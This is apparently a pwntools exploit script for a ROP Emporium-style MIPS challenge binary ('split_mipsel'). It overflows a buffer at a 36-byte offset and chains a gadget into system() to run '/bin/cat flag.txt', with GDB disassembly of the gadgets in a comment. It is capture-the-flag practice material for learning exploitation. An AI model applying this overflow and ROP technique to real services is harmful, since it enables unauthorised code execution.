from pwn import *

exe = ELF('./split_mipsel')
context.binary = exe
context.log_level = 'info'

libc = ELF('./split_mipsel')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', './split_mipsel'])

offset = 36 #pattern search $ra

usefulFunctiondirectsursys = 0x004009ec
bincat = 0x411010
usefulGadgets = 0x00400a20
padding = b'BBBB'

log.info(hex(usefulFunctiondirectsursys))

payload = flat({offset:[usefulGadgets,padding,usefulFunctiondirectsursys,bincat]})

io.sendline(payload)

io.interactive()

'''
(remote) gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x004009c8 <+0>:	addiu	sp,sp,-32
   0x004009cc <+4>:	sw	ra,28(sp)
   0x004009d0 <+8>:	sw	s8,24(sp)
   0x004009d4 <+12>:	move	s8,sp
   0x004009d8 <+16>:	lui	gp,0x42
   0x004009dc <+20>:	addiu	gp,gp,-28624
   0x004009e0 <+24>:	sw	gp,16(sp)
   0x004009e4 <+28>:	lui	v0,0x40
   0x004009e8 <+32>:	addiu	a0,v0,3208
   0x004009ec <+36>:	lw	v0,-32684(gp)
   0x004009f0 <+40>:	move	t9,v0
   0x004009f4 <+44>:	jalr	t9
   0x004009f8 <+48>:	nop
   0x004009fc <+52>:	lw	gp,16(s8)
   0x00400a00 <+56>:	nop
   0x00400a04 <+60>:	move	sp,s8
   0x00400a08 <+64>:	lw	ra,28(sp)
   0x00400a0c <+68>:	lw	s8,24(sp)
   0x00400a10 <+72>:	addiu	sp,sp,32
   0x00400a14 <+76>:	jr	ra
   0x00400a18 <+80>:	nop
End of assembler dump.
(remote) gef➤  



(remote) gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x00400a20 <+0>:	lw	a0,8(sp)
   0x00400a24 <+4>:	lw	t9,4(sp)
   0x00400a28 <+8>:	jalr	t9
   0x00400a2c <+12>:	nop
End of assembler dump.
(remote) gef➤  
'''